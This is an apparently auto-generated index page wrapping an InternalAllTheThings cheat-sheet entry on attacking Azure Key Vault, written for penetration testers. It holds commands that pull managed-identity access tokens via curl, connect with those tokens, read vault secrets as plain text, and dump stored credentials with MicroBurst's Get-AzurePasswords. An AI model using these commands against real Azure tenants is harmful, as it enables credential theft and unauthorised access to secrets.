---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure Services - KeyVault

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-services-keyvault` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-keyvault.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure Services - KeyVault](../../topics/cloud/azure-services-keyvault.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-services-keyvault |
| name | Azure Services - KeyVault |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-services-keyvault.md |

## Preserved Source Material

````yaml
_body: "# Azure Services - KeyVault\n\n## Access Token\n\n* Keyvault access token\n\n    ```powershell\n    curl \"$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01\"\
  \ -H secret:$IDENTITY_HEADER\n    curl \"$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01\"\
  \ -H secret:$IDENTITY_HEADER\n    ```\n\n* Connect with the access token\n\n    ```ps1\n    PS> $token = 'eyJ0..'\n    PS>\
  \ $keyvaulttoken = 'eyJ0..'\n    PS> $accid = '2e...bc'\n    PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid\
  \ -KeyVaultAccessToken $keyvaulttoken\n    ```\n\n## Query Secrets\n\n* Query the vault and the secrets\n\n    ```ps1\n\
  \    PS Az> Get-AzKeyVault\n    PS Az> Get-AzKeyVaultSecret -VaultName <VaultName>\n    PS Az> Get-AzKeyVaultSecret -VaultName\
  \ <VaultName> -Name Reader -AsPlainText\n    ```\n\n* Extract secrets from Automations, AppServices and KeyVaults\n\n  \
  \  ```powershell\n    Import-Module Microburst.psm1\n    PS Microburst> Get-AzurePasswords\n    PS Microburst> Get-AzurePasswords\
  \ -Verbose | Out-GridView\n    ```\n\n## References\n\n* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure\
  \ Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)"
_relative_path: cloud/azure/azure-services-keyvault.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-keyvault.md
````
